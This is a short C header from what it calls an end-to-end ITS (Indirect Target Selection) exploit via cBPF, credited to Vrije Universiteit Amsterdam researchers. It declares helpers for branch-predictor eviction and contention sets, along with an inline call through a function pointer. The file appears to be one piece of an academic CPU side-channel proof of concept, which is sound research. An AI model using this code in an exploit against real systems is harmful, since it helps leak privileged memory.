/*
 * End-to-end ITS (Indirect Target Selection) exploit via cBPF
 * Friday, March 22th 2024
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _BRANCH_EVICTION_H_
#define _BRANCH_EVICTION_H_

#include <stdint.h>


uint64_t initialize_evicting_branch(uint64_t evict_target);
void initialize_branch_contention_set(void * branch_contention_list[], uint64_t contention_target);

typedef uint64_t (*evict_entry_t)(void);

__always_inline void walk_branch_eviction(void * eviction_entry) {

    ((evict_entry_t) eviction_entry)();

}



#endif //_BRANCH_EVICTION_H_
